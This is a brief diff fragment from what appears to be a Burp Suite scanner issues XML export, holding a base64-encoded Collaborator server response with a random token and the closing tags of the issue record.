+        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYxDQoNCjxodG1sPjxib2R5PjFleWJjcTg3OWtxeG9yNzd6dHp5bnJ6amxnaWdpZ2pmaWd6PC9ib2R5PjwvaHRtbD4=]]></response>
+        <responseRedirected>false</responseRedirected>
+      </requestresponse>
+    </collaboratorEvent>
+  </issue>
+</issues>
